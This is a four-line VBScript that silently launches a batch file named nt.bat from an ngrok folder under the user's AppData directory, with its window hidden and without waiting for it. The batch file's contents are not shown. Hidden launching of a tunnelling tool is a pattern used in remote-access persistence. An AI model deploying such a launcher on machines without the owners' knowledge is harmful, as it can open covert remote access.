Set WshShell = CreateObject("WScript.Shell")
Dim batPath
batPath = "C:\Users\%USERNAME%\AppData\Local\ngrok\nt.bat" '
WshShell.Run """" & batPath & """", 0, False
